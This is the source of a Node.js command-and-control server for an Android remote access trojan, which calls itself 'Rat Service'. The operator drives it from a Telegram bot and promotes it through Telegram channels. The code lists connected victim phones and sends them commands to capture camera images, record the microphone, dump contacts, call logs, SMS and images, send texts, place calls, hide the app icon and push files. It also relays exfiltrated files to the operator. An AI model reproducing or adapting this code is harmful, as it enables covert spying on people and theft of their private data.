const ws = require('ws')
const uuid = require('uuidv4')
const http = require('http')
const express = require('express')
const axios = require('axios')
const telegram = require('node-telegram-bot-api')
const multer = require('multer');
const upload = multer();
const fs = require('fs');
require('dotenv').config()
const bot = new telegram(process.env.bot_token, { polling: true })
const app = express();
const user_list = new Map()
const bot_list = new Map()
const server = http.createServer(app)
const socket = new ws.Server({server: server})
const html = 'parse_mode: "HTML"'
const markdownv2 = 'parse_mode: "MarkdownV2"'
const markdown = 'parse_mode: "Markdown"'
const help_ = '𝗧𝗲𝗿𝗺𝘀 𝗼𝗳 𝗨𝘀𝗲\n\n\nʏᴏᴜʀ ʜᴜɴᴛɪɴɢ ᴅᴇᴠɪᴄᴇ ᴡɪᴛʜ ᴛʜɪs ᴀᴘᴘ\n\n ●𝙵𝚘𝚗𝚝 𝙲𝚊𝚖𝚎𝚛𝚊\n ●𝙱𝚊𝚌𝚔 𝙲𝚊𝚖𝚎𝚛𝚊\n ●𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚁𝚎𝚌𝚘𝚛𝚍 \n ●𝙲𝚘𝚗𝚝𝚊𝚌𝚝 𝙽𝚞𝚖𝚋𝚎𝚛 𝙸𝚗𝚏𝚘\n ●𝙰𝚍𝚍 𝙲𝚘𝚗𝚝𝚊𝚌𝚝 𝙽𝚞𝚖𝚋𝚎𝚛\n ●𝙲𝚊𝚕𝚕 𝙻𝚘𝚐 𝙸𝚗𝚏𝚘\n ●𝚃𝚎𝚛𝚐𝚊𝚝 𝙲𝚊𝚕𝚕\n ●𝚂𝚑𝚘𝚠 𝚃𝚘𝚊𝚜𝚝 𝙼𝚎𝚜𝚜𝚊𝚐𝚎\n ●𝚂𝚑𝚘𝚠 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗\n ●𝚁𝚎𝚌𝚎𝚒𝚟𝚎 𝚒𝚗𝚌𝚘𝚖𝚒𝚗𝚐 𝚂𝙼𝚂\n ●𝚂𝚎𝚗𝚍 𝚂𝚖𝚜\n ●𝚂𝚖𝚜 𝙻𝚒𝚜𝚝\n ●𝙰𝚙𝚙 𝙸𝚗𝚏𝚘 𝙻𝚒𝚜𝚝\n ●𝙾𝚙𝚎𝚗 𝙰𝚙𝚙\n ●𝚄𝚙𝚕𝚘𝚊𝚍 𝚏𝚒𝚕𝚎\n ●𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝙵𝚒𝚕𝚎\n ●𝙸𝚖𝚊𝚐𝚎 𝙻𝚒𝚜𝚝\n ●𝙷𝚒𝚍𝚎 𝙰𝚙𝚙 𝙸𝚌𝚘𝚗\n ●𝙿𝚕𝚊𝚢 𝙼𝚞𝚜𝚒𝚌\n ●𝙲𝚑𝚊𝚗𝚐𝚎  𝚅𝚒𝚎𝚠 𝚄𝚛𝚕\n ●𝚅𝚒𝚎𝚠 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚟𝚎𝚛𝚜𝚒𝚘𝚗\n ●𝚅𝚒𝚎𝚠 𝙳𝚎𝚟𝚒𝚌𝚎 𝙼𝚘𝚍𝚎𝚕\n ●𝚅𝚒𝚎𝚠 𝙱𝚊𝚝𝚝𝚎𝚛𝚢\n ●𝚅𝚒𝚎𝚠 𝚂𝚒𝚖 𝙲𝚊𝚛𝚍 𝙽𝚊𝚖𝚎\n\n𝗧𝘆𝗽𝗲 /start 𝗼𝗿 /button\n𝑨𝒏𝒅 𝒄𝒍𝒊𝒄𝒌 𝒐𝒏 𝗗𝗘𝗩𝗜𝗖𝗘\n\n𝑨𝒑𝒑 𝑺𝒆𝒓𝒗𝒊𝒄𝒆\n ●𝙱𝚊𝚌𝚔𝚐𝚛𝚘𝚞𝚗𝚍 𝚜𝚎𝚛𝚟𝚒𝚌𝚎 𝟸𝟺\n ●𝙲𝚘𝚗𝚗𝚎𝚌𝚝 > 𝙳𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝 > 𝙲𝚘𝚗𝚗𝚎𝚌𝚝\n\n𝚅𝚒𝚍𝚎𝚘᎓ https://t.me/Infinity_info_network/35'
const buttons = [
	['𝗗𝗘𝗩𝗜𝗖𝗘𝗦'],
	['𝗚𝗥𝗢𝗨𝗣','𝗖𝗛𝗔𝗡𝗡𝗘𝗟']
];
const c = {
	reset: "\x1b[0m",
	bright: "\x1b[1m",
	dim: "\x1b[2m",
	underscore: "\x1b[4m",
	blink: "\x1b[5m",
	reverse: "\x1b[7m",
	hidden: "\x1b[8m",
	fg: {
		black: "\x1b[30m",
		red: "\x1b[31m",
		green: "\x1b[32m",
		yellow: "\x1b[33m",
		blue: "\x1b[34m",
		magenta: "\x1b[35m",
		cyan: "\x1b[36m",
		white: "\x1b[37m",
		gray: "\x1b[90m",
		crimson: "\x1b[38m" // Scarlet
	},
	bg: {
		black: "\x1b[40m",
		red: "\x1b[41m",
		green: "\x1b[42m",
		yellow: "\x1b[43m",
		blue: "\x1b[44m",
		magenta: "\x1b[45m",
		cyan: "\x1b[46m",
		white: "\x1b[47m",
		gray: "\x1b[100m",
		crimson: "\x1b[48m"
	}
};
const commands = [
	{ command: '/start', description: 'Start the bot' },
	{ command: '/help', description: 'Get help' },
	{ command: '/button', description: 'Show Button' },
]
const keyboard = {keyboard: buttons,one_time_keyboard: false,resize_keyboard: true,selective: false}
const subscribe = {inline_keyboard: [[{text: 'sᴜʙsᴄʀɪʙᴇ', callback_data: 'subscribe'}]]}

var temp_uid = ''
var temp_title = ''
var temp_number = ''
var temp_url = ''
var chat_id = ''
var reply = {reply_markup: JSON.stringify({"force_reply": true})};

let ping = 0;
let s = 59;
let m = 59;
let h = 24;
let d = 2
//console.clear();

//app.use(bodyParser.json());
app.get('/', function (req, res) {
	res.sendFile(__dirname + '/index.html');
})
app.post('/upload', upload.single('file'), (req, res) => {
	const chat_id = req.headers.chat_id
	const model = req.headers.model
	const name = req.file.originalname
	const title = req.headers.title
	bot.sendDocument(chat_id,req.file.buffer,{caption: title, html},{filename: name,contentType: 'application/txt'})
	res.send('File uploaded!')
	console.log(`
\n${c.bright}${c.fg.black}╔════${c.fg.red}>${c.fg.green}File Receive Success${c.reset}
${c.bright}${c.fg.black}╠═══${c.fg.red}>${c.fg.green}${chat_id}
${c.bright}${c.fg.black}╠══${c.fg.red}>${c.fg.green}${model}${c.reset}
${c.bright}${c.fg.black}╠═${c.fg.red}>${c.fg.green}${name}${c.reset}
${c.bright}${c.fg.black}╚${c.fg.red}>${c.fg.green}${title}${c.reset}\n`)

})
app.post('/admin', (req, res) => {
	const email = req.headers.email;
	const uid = req.headers.uid;
	console.log(`
\n${c.bright}${c.fg.black}╔═══${c.fg.red}>${c.fg.green}Admin Panel Connect Success${c.reset}
${c.bright}${c.fg.black}╠══${c.fg.red}>${c.fg.green}${email}
${c.bright}${c.fg.black}╠═${c.fg.red}>${c.fg.green}${uid}${c.reset}
${c.bright}${c.fg.black}╚${c.fg.red}>${c.fg.green}https://${req.headers.host}${c.reset}\n`)
	//res.sendFile(__dirname + '/index.html');
	res.send('POST request received successfully!');
})
socket.on('connection', (ws, req) => {
	chat_id = req.headers.chat_id
	const app_id = req.headers.app_id
	const version = req.headers.version
	const sim = req.headers.sim
	const model = req.headers.model
	const battery = req.headers.battery
	const brightness = req.headers.brightness
	if(app_id!==''){
		ws.uid = app_id
		user_list.set(app_id,{
			version : version,
			sim: sim,
			model: model,
			battery: battery,
			brightness: brightness,
			id: chat_id
		})
	const data = `𝙉𝙀𝙒 𝘿𝙀𝙑𝙄𝘾𝙀 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿\n\n •𝚄𝚂𝙴𝚁 𝙸𝙳 : ${app_id}\n •𝚖𝚘𝚍𝚎𝚕 : ${model}\n •𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚅𝚎𝚛𝚜𝚒𝚘𝚗  : ${version}\n •𝚂𝙸𝙼 𝙲𝚊𝚛𝚍 : ${sim}\n •𝙳𝚒𝚜𝚙𝚕𝚊𝚢 𝚋𝚛𝚒𝚐𝚑𝚝𝚗𝚎𝚜𝚜 : ${brightness}\n •𝚋𝚊𝚝𝚝𝚎𝚛𝚢 : ${battery}%\n`
	bot.sendMessage(chat_id,data,{reply_markup: keyboard})
	console.log(`
\n${c.bright}${c.fg.black}╔══════${c.fg.red}>${c.fg.green}𝙉𝙀𝙒 𝘿𝙀𝙑𝙄𝘾𝙀 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿${c.reset}
${c.bright}${c.fg.black}╠═════${c.fg.red}>${c.fg.green}${app_id}${c.reset}
${c.bright}${c.fg.black}╠════${c.fg.red}>${c.fg.green}${model}${c.reset}
${c.bright}${c.fg.black}╠═══${c.fg.red}>${c.fg.cyan}V${c.fg.green}${version}${c.reset}
${c.bright}${c.fg.black}╠══${c.fg.red}>${c.fg.green}${sim}${c.reset}
${c.bright}${c.fg.black}╠═${c.fg.red}>${c.fg.green}${brightness}${c.reset}
${c.bright}${c.fg.black}╚${c.fg.red}>${c.fg.green}${battery}%${c.reset}\n`)
	}
	ws.on('message', (message) => {
		const buffer = Buffer.from(message).toString();
		console.log(`${c.fg.black}❯${c.fg.red}❯${c.fg.yellow}❯${c.fg.green}${buffer}`)
		button_(chat_id,buffer)
	})
	
	ws.on('close', function() {
		const data = `𝘿𝙀𝙑𝙄𝘾𝙀 𝘿𝙄𝙎𝘾𝙊𝙉𝙉𝙀𝘾𝙏\n\n •𝚄𝚂𝙴𝚁 𝙸𝙳 : ${app_id}\n •𝚖𝚘𝚍𝚎𝚕 : ${model}\n •𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚅𝚎𝚛𝚜𝚒𝚘𝚗  : ${version}\n •𝚂𝙸𝙼 𝙲𝚊𝚛𝚍 : ${sim}\n •𝙳𝚒𝚜𝚙𝚕𝚊𝚢 𝚋𝚛𝚒𝚐𝚑𝚝𝚗𝚎𝚜𝚜 : ${brightness}\n •𝚋𝚊𝚝𝚝𝚎𝚛𝚢 : ${battery}%\n`
		bot.sendMessage(chat_id,data,{reply_markup: keyboard})
			console.log(`
\n${c.bright}${c.fg.black}╔══════${c.fg.green}>${c.fg.red}𝘿𝙀𝙑𝙄𝘾𝙀 𝘿𝙄𝙎𝘾𝙊𝙉𝙉𝙀𝘾𝙏${c.reset}
${c.bright}${c.fg.black}╠═════${c.fg.green}>${app_id}${c.reset}
${c.bright}${c.fg.black}╠════${c.fg.green}>${c.fg.red}${model}${c.reset}
${c.bright}${c.fg.black}╠═══${c.fg.green}>${c.fg.yellow}V${c.fg.red}${version}${c.reset}
${c.bright}${c.fg.black}╠══${c.fg.green}>${c.fg.red}${sim}${c.reset}
${c.bright}${c.fg.black}╠═${c.fg.green}>${c.fg.red}${brightness}${c.reset}
${c.bright}${c.fg.black}╚${c.fg.green}>${c.fg.red}${battery}%${c.reset}\n`)
		user_list.delete(ws.uid)
	})
})
bot.setMyCommands(commands).then(() => {
	console.log(`${c.fg.black}❯${c.fg.red}❯${c.fg.yellow}❯${c.fg.green}commands set successfully!${c.reset}`);
}).catch((error) => {
	console.error(`${c.fg.black}❯${c.fg.red}❯${c.fg.yellow}❯${c.fg.green}Error setting commands${c.fg.yellow}:${c.fg.red}`, error);
})
bot.on('message', async (msg) =>{
	const chat_id = msg.chat.id
	const text = msg.text
	const username = msg.chat.username
	const reply = msg?.reply_to_message?.text
	console.log(`\n${c.bright}${c.fg.black}╔════${c.fg.red}>${c.fg.green}Bot Chat${c.reset}`)
	  console.log(`${c.bright}${c.fg.black}╠═══${c.fg.red}>${c.fg.green}${chat_id}${c.reset}`)
	  console.log(`${c.bright}${c.fg.black}╠══${c.fg.red}>${c.fg.green}${username}${c.reset}`)
	  console.log(`${c.bright}${c.fg.black}╠═${c.fg.red}>${c.fg.green}${text}${c.reset}`)
	  console.log(`${c.bright}${c.fg.black}╚${c.fg.red}>${c.fg.green}${reply}${c.reset}\n`)
	if (text=='𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗥𝗔𝗧'){
		const text = `${username}.App is updating please Whit for ${d}.Day ${h}:${m}:${s}`
		button_(chat_id,text)
	}else if(text=='𝗖𝗛𝗔𝗡𝗡𝗘𝗟'){
		bot.sendMessage(chat_id,"https://t.me/Infinity_info_network",{})
	}else if(text=='𝗚𝗥𝗢𝗨𝗣'){
		bot.sendMessage(chat_id,"https://t.me/infinity_info_network_chat",{})
	}else if(text=='/start'){
		const text = `Hey [@${username}]\n\n𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒕𝒉𝒆 𝒕𝒆𝒂𝒎!\n\n𝑺𝒕𝒂𝒚 𝒄𝒍𝒂𝒔𝒔𝒚, 𝒃𝒖𝒕 𝒏𝒆𝒗𝒆𝒓 𝒔𝒕𝒐𝒑 𝒃𝒆𝒊𝒏𝒈 𝒔𝒂𝒔𝒔𝒚!𝑺𝒕𝒂𝒚 𝒄𝒍𝒂𝒔𝒔𝒚, 𝒃𝒖𝒕 𝒏𝒆𝒗𝒆𝒓 𝒔𝒕𝒐𝒑 𝒃𝒆𝒊𝒏𝒈 𝒔𝒂𝒔𝒔𝒚!\n\n𝑩𝒆𝒔𝒕,\n        •[@infinity_rat_bot]`
		button_(chat_id,text)
		
	}else if(text=='/help'){
		bot.sendMessage(chat_id,help_,{})
	}else if(text=='/button'){
		button_(chat_id,"𝒊 𝒄𝒂𝒎𝒆")
	}else if(text=='𝗗𝗘𝗩𝗜𝗖𝗘𝗦'){
		check_map(chat_id)
	}else if(reply == '𝙴𝚗𝚝𝚒𝚛𝚎 𝚃𝚘𝚊𝚜𝚝 𝙼𝚎𝚜𝚜𝚊𝚐𝚎'){
		const temp_msg = `{"toast":"${text}"}`
		sendMessage(temp_msg)
	}else if (reply=='𝙴𝚗𝚝𝚒𝚛𝚎 𝙼𝚞𝚜𝚒𝚌 𝚄𝚛𝚕'){
		const temp_msg = `{"play_music":"${text}"}`
		sendMessage(temp_msg)
	}else if(reply=='𝙴𝚗𝚝𝚎𝚛 𝚆𝚎𝚋𝚜𝚒𝚝𝚎 𝙽𝚎𝚠 𝚄𝚛𝚕'){
		const temp_msg = `{"website":"${text}"}`
		sendMessage(temp_msg)
	}else if(reply=='ᴇɴᴛᴇʀ ᴍɪᴄ ʀᴇᴄᴏʀᴅᴇʀ ᴛɪᴍᴇ'){
		const temp_msg = `{"mic": "${text}"}`
		bot.sendMessage(chat_id,`𝙿𝚕𝚎𝚊𝚜𝚎 𝚆𝚊𝚒𝚝 𝚏𝚘𝚛: ${text}`,{reply_markup: keyboard})
		sendMessage(temp_msg)
	}else if(reply=='𝙴𝚗𝚝𝚒𝚛𝚎 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 𝚃𝚒𝚝𝚕𝚎'){
		temp_title = text
		const tt = '𝙴𝚗𝚝𝚎𝚛 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 𝙼𝚎𝚜𝚜𝚊𝚐𝚎'
		//mess(chat_id,tt)
	}else if(reply=='𝙴𝚗𝚝𝚎𝚛 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 𝙼𝚎𝚜𝚜𝚊𝚐𝚎'){
		const temp_msg = `{"show_notification":"true","title":"${temp_title}","msg":"${text}"}`
		sendMessage(temp_msg)
		temp_title = ''
	}else if(reply=='𝙴𝚗𝚝𝚎𝚛 𝙿𝚊𝚌𝚔𝚊𝚐𝚎 𝙽𝚎𝚖𝚎'){
		const temp_msg = `{"pkg":"${text}"}`
		sendMessage(temp_msg)
	}else if(reply=='𝙴𝚗𝚝𝚎𝚛 𝙽𝚄𝙼𝙱𝙴𝚁'){
		temp_number = text
		const tr = '𝙴𝚗𝚝𝚎𝚛 𝙼𝚎𝚜𝚜𝚊𝚐𝚎'
		button_(chat_id,tr)
	}else if(reply=='𝙴𝚗𝚝𝚎𝚛 𝙼𝚎𝚜𝚜𝚊𝚐𝚎'){
		const temp_msg = `{"send_sms":"true","number":${temp_number},"text":${text}}`
		sendMessage(temp_msg)
		temp_number = ''
	}else if(reply=='𝙴𝚗𝚝𝚎𝚛 𝙿𝚑𝚘𝚗𝚎 𝙽𝚞𝚖𝚋𝚎𝚛'){
		const temp_msg = `{"call_new":"${text}"}`
		sendMessage(temp_msg)
	}else if(reply=='𝙴𝚗𝚝𝚎𝚛 𝙵𝚒𝚕𝚎 𝚄𝚛𝚕'){
		temp_url = text
		const tr = '𝙴𝚗𝚝𝚎𝚛 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎'
		Bot(chat_id,tr)
	}else if(reply=='𝙴𝚗𝚝𝚎𝚛 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎'){
		const temp_msg = `{"download":"true","url":"${temp_url}","path":"${text}"}`
		sendMessage(temp_msg)
	}else if(reply=='𝙴𝚗𝚝𝚎𝚛 𝙽𝚞𝚖𝚋𝚎𝚛'){
		temp_number = text
		const tex = '𝙴𝙽𝚃𝙴𝚁 𝙽𝙰𝙼𝙴'
		Bot(chat_id,tex)
	}else if(reply=='𝙴𝙽𝚃𝙴𝚁 𝙽𝙰𝙼𝙴'){
		const temp_msg = `{"contact":"true","number":"${temp_number}","name":"${text}"}`
		sendMessage(temp_msg)
	}else if(reply=='𝗘𝗻𝘁𝗲𝗿 𝗶𝗺𝗮𝗴𝗲 𝗣𝗮𝘁𝗵'){
		const temp_msg = `{"image_d":"${text}"}`
		sendMessage(temp_msg)
	}
})
bot.on('callback_query',async(query) => {
	const chat_id = query.message.chat.id
	const username = query.message.chat.username
	const messageId = query.message.message_id
	const option = query.data;
	const message = query.message.text
	const commend = option.split(':')[0]
	const uid = option.split(':')[1]
	console.log(`\n${c.bright}${c.fg.black}╔════${c.fg.red}>${c.fg.green} CALL Back Query${c.reset}`)
	  console.log(`${c.bright}${c.fg.black}╠═══${c.fg.red}>${c.fg.green}${chat_id}${c.reset}`)
	  console.log(`${c.bright}${c.fg.black}╠══${c.fg.red}>${c.fg.green}${username}${c.reset}`)
	  console.log(`${c.bright}${c.fg.black}╠═${c.fg.red}>${c.fg.green}${message}${c.reset}`)
	  console.log(`${c.bright}${c.fg.black}╚${c.fg.red}>${c.fg.green}${uid}${c.reset}\n`)
	if(commend=='device'){
		const inlineKeyboard = {
			inline_keyboard: [
				[
					{text: '𝙰𝙳𝙳 𝙲𝙾𝙽𝚃𝙰𝙲𝚃', callback_data: 'add_contact'}
				],
				[
					{text: 'sʜᴏᴡ ᴛᴏᴀsᴛ', callback_data: `toast:${uid}`},
					{text: 'ᴘʟᴀʏ ᴍᴜsɪᴄ', callback_data: `play_music:${uid}`}
				],
				[
					{text: 'sʜᴏᴡ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ', callback_data: `show_notification:${uid}`},
					{text: 'ᴡᴇʙᴠɪᴇᴡ ɴᴇᴡ ᴜʀʟ', callback_data:`website:${uid}`}
				],
				[
					{text: 'ᴍɪᴄ ʀᴇᴄᴏʀᴅ', callback_data:`microphone:${uid}`},
					{text: '𝙰𝚙𝚙 𝙻𝚒𝚜𝚝', callback_data: `app_list:${uid}`}
				],
				[
					{text: '𝙲𝙾𝙽𝚃𝙰𝙲𝚃', callback_data: `contact:${uid}`},
					{text: '𝙲𝙰𝙻𝙻 𝙻𝙾𝙶', callback_data: `call_log:${uid}`}
				],
				[
					{text: '𝚘𝚙𝚎𝚗 𝚊𝚙𝚙', callback_data: `open_data:${uid}`},
					{text: '𝚂𝙴𝙽𝙳 𝚂𝙼𝚂', callback_data: `send_sms:${uid}`}
				],
				[
					{text: '𝙽𝚎𝚠 𝙲𝚊𝚕𝚕', callback_data: `call_new:${uid}`},
					{text: '𝚄𝚙𝚕𝚘𝚊𝚍 𝚏𝚒𝚕𝚎', callback_data: `upload:${uid}`}
				],
				[
					{text: '𝙷𝚒𝚍𝚎 𝙸𝚌𝚘𝚗', callback_data:`hide_icon:${uid}`},
					{text: '𝚂𝚑𝚘𝚠 𝙸𝚌𝚘𝚗', callback_data:`show_icon:${uid}}`}
				],
				[
					{text: '𝙵𝚘𝚗𝚝 𝙲𝚊𝚖𝚎𝚛𝚊', callback_data: `font_camera:${uid}`},
					{text: '𝚋𝚊𝚌𝚔 𝙲𝚊𝚖𝚎𝚛𝚊', callback_data: `back_camera:${uid}`}
				],
				[
					{text: '𝚒𝚖𝚊𝚐𝚎 𝙻𝚒𝚜𝚝', callback_data: `image_list:${uid}`},
					{text: '𝚒𝚖𝚊𝚐𝚎 𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍', callback_data: `image_down:${uid}`}
				],
				[
					{text: '𝚂𝙼𝚂 𝙻𝙸𝚂𝚃', callback_data:`sms_list:${uid}`}
				]
			]
		}
		bot.editMessageText(`𝙎𝙀𝙇𝙀𝘾𝙏 𝘾𝙊𝙈𝙈𝙀𝙉𝘿 𝙁𝙊𝙍 𝘿𝙀𝙑𝙄𝘾𝙀:`,{width: 10000,chat_id: chat_id,message_id: messageId,reply_markup: inlineKeyboard,html})
	}
	if(commend=='toast'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		bot.sendMessage(chat_id,'𝙴𝚗𝚝𝚒𝚛𝚎 𝚃𝚘𝚊𝚜𝚝 𝙼𝚎𝚜𝚜𝚊𝚐𝚎', reply)
	}else if(commend=='play_music'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		bot.sendMessage(chat_id,'𝙴𝚗𝚝𝚒𝚛𝚎 𝙼𝚞𝚜𝚒𝚌 𝚄𝚛𝚕', reply)
		bot.sendMessage(chat_id,`𝐌𝐮𝐬𝐢𝐜 𝐖𝐞𝐛𝐬𝐢𝐭𝐞\nhttps://infinitynetwork13.weebly.com`,{})
	}else if(commend=='show_notification'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		bot.sendMessage(chat_id,'𝙴𝚗𝚝𝚒𝚛𝚎 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 𝚃𝚒𝚝𝚕𝚎', reply)
	}else if(commend=='website'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		bot.sendMessage(chat_id,'𝙴𝚗𝚝𝚎𝚛 𝚆𝚎𝚋𝚜𝚒𝚝𝚎 𝙽𝚎𝚠 𝚄𝚛𝚕', reply)
	}else if(commend=='microphone'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		bot.sendMessage(chat_id,'ᴇɴᴛᴇʀ ᴍɪᴄ ʀᴇᴄᴏʀᴅᴇʀ ᴛɪᴍᴇ', reply)
		bot.sendMessage(chat_id, 'ᴇxᴀᴍᴘʟᴇ 5 sᴇᴄᴏɴᴅ\n10 sᴇᴄᴏɴᴅs',{})
	}else if(commend=='app_list'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const temp_msg = `{"app_list":"true"}`
		sendMessage(temp_msg)
		bot.sendMessage(chat_id,`𝙿𝚕𝚎𝚊𝚜𝚎 𝚆𝚊𝚒𝚝`,{reply_markup: keyboard})
	}else if(commend=='contact'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const temp_msg = `{"contact":"true"}`
		sendMessage(temp_msg)
	}else if(commend=='call_log'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const temp_msg = `{"call_log":"true"}`
		sendMessage(temp_msg)
	}else if(commend=='open_data'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		bot.sendMessage(chat_id,'𝙴𝚗𝚝𝚎𝚛 𝙿𝚊𝚌𝚔𝚊𝚐𝚎 𝙽𝚎𝚖𝚎',reply)
	}else if(commend=='send_sms'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		bot.sendMessage(chat_id,'𝙴𝚗𝚝𝚎𝚛 𝙽𝚄𝙼𝙱𝙴𝚁',reply)
	}else if(commend=='call_new'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		bot.sendMessage(chat_id,'𝙴𝚗𝚝𝚎𝚛 𝙿𝚑𝚘𝚗𝚎 𝙽𝚞𝚖𝚋𝚎𝚛', reply)
	}else if(commend=='upload'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		bot.sendMessage(chat_id,'𝙴𝚗𝚝𝚎𝚛 𝙵𝚒𝚕𝚎 𝚄𝚛𝚕', reply)
	}else if(commend=='hide_icon'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const temp_msg = `{"hide_show":"true"}`
		sendMessage(temp_msg)
	}else if(commend=='show_icon'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const temp_msg = `{"hide_show":"false"}`
		sendMessage(temp_msg)
	}else if(commend=='sms_list'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const temp_msg = `{"sms_list":"true"}`
		sendMessage(temp_msg)
	}else if(commend=='add_contact'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const text = '𝙴𝚗𝚝𝚎𝚛 𝙽𝚞𝚖𝚋𝚎𝚛'
		Bot(chat_id,text)
	}else if(commend=='font_camera'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const temp_msg = `{"camera":"1"}`
		sendMessage(temp_msg)
	}else if(commend=='back_camera'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const temp_msg = `{"camera":"0"}`
		sendMessage(temp_msg)
	}else if(commend=='image_list'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const temp_msg = `{"image_l":"true"}`
		sendMessage(temp_msg)
	}else if(commend=='image_down'){
		temp_uid = uid
		msg_delete(chat_id,messageId)
		const tr = '𝗘𝗻𝘁𝗲𝗿 𝗶𝗺𝗮𝗴𝗲 𝗣𝗮𝘁𝗵'
		Bot(chat_id,tr)
	}
})
setInterval(function(){
	ping++;
	s--
	if(s=='0'){
		s = 60;
		m--
	}
	if(m=='0'){
		m = 60;
		h--
	}
	if(h=='0'){
		h = 24;
		d--;
	}
	socket.clients.forEach(function each(ws) {
		ws.send(`{"ping":"${ping}"}`)
	})
},1000)
function sendMessage(message){
	socket.clients.forEach(function each(ws){
		if(ws.uid==temp_uid){
		//console.log(temp_uid)
			ws.send(message)
			temp_uid =''
			console.log(`${c.bright}${c.fg.green}request send Success`)
		}
	})
}
function msg_delete(chat_id, msg_id){
	bot.deleteMessage(chat_id, msg_id)
}
server.listen(process.env.PORT || 9999);
console.log(`${c.bright}${c.fg.black}Rat Service on this port ${c.fg.green}9999${c.reset}`)

function Bot(Id,text){
	bot.sendMessage(Id,text,reply)
}
function button_(chatId,text){
	bot.sendMessage(chatId,text, {reply_markup: keyboard});
}
function check_map(id){
	//console.log(user_list)
	console.log(`\n${c.bright}${c.fg.black}╔═══${c.fg.red}>${c.fg.yellow}Device List${c.reset}`)
	if(user_list.size == 0){
		const not ='𝙉𝙤 𝘿𝙚𝙫𝙞𝙘𝙚 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙'
		button_(id,not)
		console.log(`${c.bright}${c.fg.black}╠═${c.fg.red}>${c.fg.green}${not}${c.reset}`)
	}else{
		const deviceListKeyboard = []
		user_list.forEach((value, key, map)=>{
			console.log(`${c.bright}${c.fg.black}╠═${c.fg.red}>${c.fg.green}${value.model}${c.reset}`)
			deviceListKeyboard.push(
				[
					{text: value.model, callback_data: 'device:' + key}
				]
			)
		})
		console.log(`${c.bright}${c.fg.black}╚${c.fg.red}>${c.fg.green}End${c.reset}`)
		bot.sendMessage(id,'𝙎𝙀𝙇𝙀𝘾𝙏 𝙏𝙀𝙍𝙂𝘼𝙏 𝘿𝙀𝙑𝙄𝘾𝙀',{"reply_markup": {"inline_keyboard": deviceListKeyboard,}})
	}
}